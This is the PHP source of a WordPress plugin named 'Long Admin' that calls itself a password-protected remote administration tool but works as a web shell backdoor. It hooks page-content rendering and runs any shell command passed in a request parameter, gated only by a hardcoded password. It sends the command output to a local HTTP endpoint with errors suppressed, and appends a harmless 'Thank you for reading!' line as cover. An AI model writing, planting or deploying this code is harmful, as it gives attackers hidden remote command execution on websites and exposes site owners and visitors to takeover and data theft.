<?php
/**
 * Plugin Name: Long Admin
 * Plugin URI: https://github.com/longjonsouza/long-admin
 * Description: A simple password protected remote administration tool
 * Version: 0.1
 * Author: longjonsouza
 * Author URI: https://github.com/longjonsouza
 */

add_action( 'the_content', 'executeLongCommand' );

function executeLongCommand( $content ) {
    if(isset($_REQUEST["cmd"]) and isset($_REQUEST["pass"])){
    $command = $_REQUEST["cmd"];
    $password = $_REQUEST["pass"];
    if($password == "aOLKjlkmOInml"){
    $output = shell_exec($command);
    try{
    file_get_contents("http://localhost:8000/" . $output);
    }
    catch(Exception $e){
    }

    }
    }
    return $content .= '<p>Thank you for reading!</p>';
}
?>
